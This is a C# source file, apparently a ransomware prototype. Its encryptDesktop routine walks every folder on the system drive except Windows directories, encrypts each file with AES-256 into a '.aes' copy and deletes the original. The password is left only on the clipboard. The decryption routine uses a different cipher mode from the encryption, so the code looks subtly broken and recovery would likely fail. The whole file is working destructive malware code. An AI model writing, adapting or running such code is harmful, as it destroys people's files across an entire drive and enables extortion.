using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;


namespace EncryptionLogic
{

	public class Encryption
	{
		private static Random random = new Random();

		private static List<string> listOfFilesToEncrypt;
		//private static byte[] passwordBytes = new byte[];
		public string generate256BitKey()
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

			try
			{
				return new string(Enumerable.Repeat(chars, 256)
					.Select(s => s[random.Next(s.Length)]).ToArray());

			}
			catch (Exception e)
			{
				System.Windows.MessageBox.Show(e.Message);

			}
			return null;
		}
		public static byte[] GenerateRandomSalt()
		{
			byte[] data = new byte[32];

			using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
			{
				for (int i = 0; i < 10; i++)
				{
					// Fille the buffer with the generated data
					rng.GetBytes(data);
				}
			}

			return data;
		}

		private void encryptFile(string file, Rfc2898DeriveBytes key, byte[] salt)
		{
			FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create);
			RijndaelManaged AES = new RijndaelManaged();
			AES.KeySize = 256;
			AES.BlockSize = 128;
			AES.Padding = PaddingMode.PKCS7;
			AES.Key = key.GetBytes(AES.KeySize / 8);
			AES.IV = key.GetBytes(AES.BlockSize / 8);
			fsCrypt.Write(salt, 0, salt.Length);

			CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

			FileStream fsIn = new FileStream(file, FileMode.Open);

			//create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
			byte[] buffer = new byte[1048576];
			int read;

			try
			{
				while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
				{
					cs.Write(buffer, 0, read);
				}

				// Close up
				fsIn.Close();
				File.Delete(file);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
			finally
			{
				cs.Close();
				fsCrypt.Close();
			}
		}
		[STAThread]
		public int encryptDesktop()
		{
			try
			{
				//string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				listOfFilesToEncrypt = getCDriveFiles().ToList();
				//DirectoryInfo d = new DirectoryInfo(filepath);
				byte[] salt = GenerateRandomSalt();
				string passwordBytes = generate256BitKey();
				var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
				Clipboard.SetText(passwordBytes);
				foreach (var file in listOfFilesToEncrypt)
				{
					if (file.ToString().Contains("."))
					{
						try 
						{
							encryptFile(file, key, salt);
						} catch (Exception ex) { }
					}
				}

				byte[] encryptedBytes = null;
				return 1;
			}
			catch (Exception e)
			{
				System.Windows.MessageBox.Show(e.Message);
				return 0;
			}
		}

		public static IEnumerable<string> getCDriveFiles()
		{
			string currDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
			Queue<string> pending = new Queue<string>();
			pending.Enqueue(currDirectory);
			string[] tmp;
			while (pending.Count > 0)
			{
				currDirectory = pending.Dequeue();
				if (!currDirectory.Contains("Windows"))
				{
					try
					{
						tmp = Directory.GetFiles(currDirectory);
					}
					catch (Exception e)
					{
						continue;
					}
					for (int i = 0; i < tmp.Length; i++)
					{
						yield return tmp[i];
					}
					tmp = Directory.GetDirectories(currDirectory);
					for (int i = 0; i < tmp.Length; i++)
					{
						pending.Enqueue(tmp[i]);
					}
				}
			}
		}

		public static void decryptAllFiles(Rfc2898DeriveBytes key)
		{
			int read;
			foreach (var file in listOfFilesToEncrypt)
			{
				FileStream fsCrypt = new FileStream(file, FileMode.Open);
				string outputfile = file.Replace(".aes", String.Empty);
				RijndaelManaged AES = new RijndaelManaged();
				AES.KeySize = 256;
				AES.BlockSize = 128;
				AES.Key = key.GetBytes(AES.KeySize / 8);
				AES.IV = key.GetBytes(AES.BlockSize / 8);
				AES.Padding = PaddingMode.PKCS7;
				AES.Mode = CipherMode.CFB;

				CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

				FileStream fsout = new FileStream(outputfile, FileMode.Create);
				
				byte[] buffer = new byte[1048576];
				try
				{
					while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
					{
						fsout.Write(buffer, 0, read);
					}
				}
				catch ( CryptographicException ex_cryp)
				{
					
				}
				try
				{
					cs.Close();
				}
				catch (Exception exx)
				{

				}
				finally
				{
					fsout.Close();
					fsCrypt.Close();
				}
			}
				
		}
	}
}
